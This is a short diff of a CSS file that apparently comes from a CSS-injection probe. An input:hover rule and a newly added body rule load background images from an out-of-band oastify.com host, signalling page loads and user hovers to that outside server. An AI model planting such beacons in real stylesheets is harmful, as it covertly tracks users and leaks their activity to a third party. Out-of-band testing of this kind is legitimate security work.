@@ -11,3 +11,7 @@ input:hover {
   background: url("http://p3tbf7aumeah619g3647hjlbz25ttjh8.oastify.com/hovered=true") no-repeat;
   background-size: 1px 1px;
 }
+
+body {
+  background: url("http://p3tbf7aumeah619g3647hjlbz25ttjh8.oastify.com/loaded") !important;
+}
